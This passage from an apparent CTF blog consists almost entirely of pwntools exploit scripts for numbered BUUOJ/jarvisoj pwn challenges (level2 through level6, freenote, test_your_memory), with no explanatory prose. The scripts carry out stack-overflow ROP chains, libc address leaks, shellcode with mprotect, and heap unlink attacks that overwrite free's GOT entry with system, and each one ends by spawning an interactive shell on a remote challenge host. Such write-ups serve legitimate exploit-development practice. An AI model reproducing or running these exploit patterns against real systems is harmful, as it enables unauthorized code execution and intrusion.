class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">#sh = process("./level2")</span><br><span class="line">sh = remote("node3.buuoj.cn",26267)</span><br><span class="line">elf = ELF("level2")</span><br><span class="line">offset = 140</span><br><span class="line">pop3_ret = 0x08048519</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p32(elf.plt['read'])</span><br><span class="line">payload += p32(pop3_ret)</span><br><span class="line">payload += p32(0) + p32(elf.bss()) + p32(0x100)</span><br><span class="line">payload += p32(elf.plt['system'])</span><br><span class="line">payload += p32(0xdeadbeef)</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.send('/bin/sh\x00')</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x83-jarvisoj-level2-x64"><a href="#0x83-jarvisoj-level2-x64" class="headerlink" title="0x83 jarvisoj_level2(x64)"></a>0x83 jarvisoj_level2(x64)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">#sh = process("level2_x64")</span><br><span class="line">sh = remote("node3.buuoj.cn",27781)</span><br><span class="line">elf = ELF("level2_x64")</span><br><span class="line">offset = 0x88</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(0x4006b3)#pop rdi   ret</span><br><span class="line">payload += p64(elf.search('/bin/sh\x00').next())</span><br><span class="line">payload += p64(elf.plt['system'])</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x84-jarvisoj-leve3"><a href="#0x84-jarvisoj-leve3" class="headerlink" title="0x84 jarvisoj_leve3"></a>0x84 jarvisoj_leve3</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">lib = ELF("libc-2.23_x32.so")</span><br><span class="line">elf = ELF("level3")</span><br><span class="line">#sh = process("./level3")</span><br><span class="line">sh = remote("node3.buuoj.cn",28412)</span><br><span class="line">#libc leak</span><br><span class="line">payload = 'a' * (0x88 + 4)</span><br><span class="line">payload += p32(elf.plt['write'])</span><br><span class="line">payload += p32(0x08048519)</span><br><span class="line">payload += p32(1)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">payload += p32(4)</span><br><span class="line">payload += p32(elf.symbols['main'])#control EIP</span><br><span class="line">sh.send(payload)</span><br><span class="line">__libc_start_main = u32(sh.recvuntil("\xf7")[-4:])</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">payload = 'a' * (0x88 + 4)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(0xdeadbeef)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x85-jarvisoj-level4"><a href="#0x85-jarvisoj-level4" class="headerlink" title="0x85 jarvisoj_level4"></a>0x85 jarvisoj_level4</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("level4")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global lib</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./level4")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23_x32.so")</span><br><span class="line">pop_ebx_ret = elf.search(asm("pop ebx\nret")).next()</span><br><span class="line">pop3_ret = elf.search(asm("pop esi\npop edi\npop ebp\nret")).next()</span><br><span class="line">offset = 140</span><br><span class="line">payload = offset * 'a'</span><br><span class="line">payload += p32(elf.plt['write'])</span><br><span class="line">payload += p32(0x08048470)</span><br><span class="line">payload += p32(1)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">payload += p32(4)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">__libc_start_main = u32(sh.recvuntil("\xf7")[-4:])</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line"></span><br><span class="line">sleep(0.2)</span><br><span class="line">payload = offset * 'a'</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(0x08048470)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",25858,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x86-jarvisoj-level5"><a href="#0x86-jarvisoj-level5" class="headerlink" title="0x86 jarvisoj_level5"></a>0x86 jarvisoj_level5</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("level3_x64")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">if debug == 1:</span><br><span class="line">sh = process("./level3_x64")</span><br><span class="line">lib = ELF("libc6_2.23-0ubuntu10_amd64.so")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc6_2.19-0ubuntu6.14_amd64.so")</span><br><span class="line">offset = 136</span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = 0x00000000004006AA</span><br><span class="line">mov_edx_call = 0x0000000000400690</span><br><span class="line">vul_addr = 0x00000000004005E6</span><br><span class="line">#leak libc</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(elf.got['__libc_start_main']) + p64(0) + p64(elf.plt['write']) + p64(elf.symbols['main'])</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Input:\n")</span><br><span class="line">__libc_start_main = u64(sh.recv(8))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">mprotect_addr = libc + lib.symbols['mprotect']</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("mprotect_addr: " + hex(mprotect_addr))</span><br><span class="line">#write shellcode to bss and write vul_addr to bss_head</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(0) #rdi = 0</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(elf.bss()) + p64(0) #rsi=bss   r15 = 0</span><br><span class="line">payload += p64(elf.plt['read']) + p64(vul_addr)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload)</span><br><span class="line">payload = p64(mprotect_addr) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Input:\n")</span><br><span class="line">#mprotect</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">payload += p64(0) #rbx</span><br><span class="line">payload += p64(1) #rbp</span><br><span class="line">payload += p64(elf.bss()) #r12</span><br><span class="line">payload += p64(7) #r13 to rdx</span><br><span class="line">payload += p64(0x1000) #r14 to rsi</span><br><span class="line">payload += p64((elf.bss() >> 16) << 16) #r15 to rdi</span><br><span class="line">payload += p64(mov_edx_call)</span><br><span class="line">payload += p64(0) * 7</span><br><span class="line">payload += p64(vul_addr)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Input:\n")</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(elf.bss() + 8)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">#nc pwn2.jarvisoj.com 9884</span><br><span class="line">pwn("pwn2.jarvisoj.com",9884,1)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x87-jarvisoj-level6"><a href="#0x87-jarvisoj-level6" class="headerlink" title="0x87 jarvisoj_level6"></a>0x87 jarvisoj_level6</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("freenote_x86")</span><br><span class="line">def showlist():</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Length of new note: ")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Enter your note: ")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(index):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("Note number: ")</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">sh.recvuntil("Length of note: ")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Enter your note: ")</span><br><span class="line">sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">#bss 804A2EC</span><br><span class="line">global sh</span><br><span class="line">offset = 0</span><br><span class="line">if debug == 1:</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">sh = process("./freenote_x86")</span><br><span class="line">else:</span><br><span class="line">lib = ELF("libc-2.23_x32.so")</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">add(7,"a"*7)#idx 0</span><br><span class="line">add(7,'a'*7)#idx 1</span><br><span class="line">free(0)</span><br><span class="line">add(4,"aaaa")#idx 2</span><br><span class="line">showlist()</span><br><span class="line">sh.recvuntil("0. aaaa")</span><br><span class="line">libc = u32(sh.recv(4)) - 48 - 0x18 - lib.symbols['__malloc_hook']</span><br><span class="line">__malloc_hook = libc - 8</span><br><span class="line">add(7,"b"*7)#idx 3</span><br><span class="line">add(7,"c"*7)#idx 4</span><br><span class="line">free(0)</span><br><span class="line">free(2)</span><br><span class="line">add(4,"aaaa")</span><br><span class="line">showlist()</span><br><span class="line">sh.recvuntil("0. aaaa")</span><br><span class="line">heap_base = (u32(sh.recv(4)) >> 12) << 12</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(3)</span><br><span class="line">payload = p32(0x0) + p32(0x81) + p32(heap_base + 0x18 - 12) + p32(heap_base + 0x18 - 8) + p32(0x80)#chunk0</span><br><span class="line">payload = payload.ljust(0x80,"6")</span><br><span class="line">payload += p32(0x80) + p32(0x80)#chunk1</span><br><span class="line">payload = payload.ljust(256,"9")</span><br><span class="line">payload += p32(0x80) + p32(0x81)#chunk2</span><br><span class="line">add(len(payload),payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = "a"*20</span><br><span class="line">add(len(payload),payload)</span><br><span class="line">showlist()</span><br><span class="line">system_addr = libc + lib.symbols['system']</span><br><span class="line">binsh_addr = libc + next(lib.search("/bin/sh\x00"))</span><br><span class="line">add(0x50,0x50*"a")</span><br><span class="line">payload = "\x250\x00\x00" + p32(1)+p32(0x4) + p32(elf.got['free']) + p32(1) + p32(0x14) + p32(heap_base+0xc280) + p32(1) + p32(0x8) + p32(heap_base + 0xda8) + p32(0) + p32(heap_base + 0xB80) + p32(0)</span><br><span class="line">payload = payload.ljust(0x108,"\x00")</span><br><span class="line">edit(0,0x108,payload)</span><br><span class="line">edit(0,4,p32(system_addr))</span><br><span class="line">edit(2,8,"/bin/sh\x00")</span><br><span class="line">showlist()</span><br><span class="line">free(2)</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">log.success("system_addr: " + hex(system_addr))</span><br><span class="line">log.success("binsh_addr: " + hex(binsh_addr))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">#nc pwn2.jarvisoj.com 9885</span><br><span class="line">pwn("node3.buuoj.cn",27261,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x88-jarvisoj-level6-x64"><a href="#0x88-jarvisoj-level6-x64" class="headerlink" title="0x88 jarvisoj_level6(x64)"></a>0x88 jarvisoj_level6(x64)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("freenote_x64")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def showlist():</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Length of new note: ")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Enter your note: ")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(index):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("Note number: ")</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">sh.recvuntil("Length of note: ")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Enter your note: ")</span><br><span class="line">sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">offset = 0</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./freenote_x64")</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23_x64.so")</span><br><span class="line">#leak libc</span><br><span class="line">add(0x80,"a"*0x80)#idx 0</span><br><span class="line">add(0x80,"b"*0x80)#idx 1</span><br><span class="line">free(0)</span><br><span class="line">add(0x8,"a"*8)#idx 0</span><br><span class="line">showlist()</span><br><span class="line">sh.recvuntil("0. aaaaaaaa")</span><br><span class="line">libc = u64(sh.recvuntil("\x0a",True).ljust(0x8,"\x00")) - 88 - lib.symbols['__malloc_hook'] - 0x10</span><br><span class="line">system_addr = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + next(lib.search("/bin/sh\x00"))</span><br><span class="line">#leak heap_base</span><br><span class="line">add(0x80,"c"*0x80) #idx 2</span><br><span class="line">add(0x80,"d"*0x80) #idx 3</span><br><span class="line">free(0)</span><br><span class="line">free(2)</span><br><span class="line">add(0x8,"d"*8)</span><br><span class="line">showlist()</span><br><span class="line">sh.recvuntil("0. dddddddd")</span><br><span class="line">heap_base = sh.recvuntil("\x0a",True)</span><br><span class="line">heap_base = heap_base.ljust(0x8,"\x00")</span><br><span class="line">heap_base = (u64(heap_base) - 0x1000)</span><br><span class="line">heap_base = (heap_base >> 12) << 12</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(3)</span><br><span class="line">#unlink</span><br><span class="line">payload = p64(0x0) + p64(0x81) + p64(heap_base + 6 * 0x8 - 0x18) + p64(heap_base + 0x8 * 6 - 0x10)</span><br><span class="line">payload = payload.ljust(0x80,"\xbb")</span><br><span class="line">payload += p64(0x80) + p64(0x80)</span><br><span class="line">payload = payload.ljust(0x80+0x80,"\xaa")</span><br><span class="line">add(len(payload),payload)</span><br><span class="line">#input()</span><br><span class="line">free(1)</span><br><span class="line">payload = p64(1) + p64(1) + p64(0x100) + p64(heap_base + 0x18) + p64(1) + p64(8) + p64(heap_base + 0x1840) + p64(0) * 2 + p64(heap_base + 0x1950) + p64(0) + p64(0) + p64(heap_base + 0x19e0)</span><br><span class="line">payload = payload.ljust(0x400,"a")</span><br><span class="line">add(0x400,payload)</span><br><span class="line">add(0x8,"\x44"*0x8)</span><br><span class="line">#write system to free_got</span><br><span class="line"></span><br><span class="line">payload = p64(2) + p64(1) + p64(0x100) + p64(heap_base + 0x18) + p64(1) + p64(0x8) + p64(elf.got['free']) + p64(1) + p64(0x8) + p64(heap_base + 0x1950) + p64(0) + p64(0) + p64(heap_base + 0x19e0)</span><br><span class="line">payload = payload.ljust(0x100,"a")</span><br><span class="line">edit(0,0x100,payload)</span><br><span class="line">showlist()</span><br><span class="line">edit(1,0x8,p64(system_addr))</span><br><span class="line">payload = p64(2) + p64(1) + p64(0x100) + p64(heap_base + 0x18) + p64(1) + p64(8) + p64(binsh)+ p64(1) + p64(0x8) + p64(heap_base + 0x1950) + p64(1) + p64(0x8) +  p64(heap_base + 0x19e0)</span><br><span class="line">payload = payload.ljust(0x100,"a")</span><br><span class="line">edit(0,0x100,payload)</span><br><span class="line">free(1)</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("system_addr: " + hex(system_addr))</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">#gdb.attach(sh.pid)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",29160,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x89-jarvisoj-test-your-memory"><a href="#0x89-jarvisoj-test-your-memory" class="headerlink" title="0x89 jarvisoj_test_your_memory"></a>0x89 jarvisoj_test_your_memory</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("node3.buuoj.cn",29078)</span><br><span class="line">#sh = process("memory")</span><br><span class="line">system_address = 0x080485BD</span><br><span class="line">junk = 'a' * 0x13</span><br><span class="line">ebp = 'a' * 0x4</span><br><span class="line">payload = junk + ebp + p32(system_address) + p32(0x080487E0) + p32(0x080487E0)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x90-jarvisoj-itemboard"><a href="#0x90-jarvisoj-itemboard" class="headerlink" title="0x90 jarvisoj_itemboard"></a>0x90 jarvisoj_itemboard</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 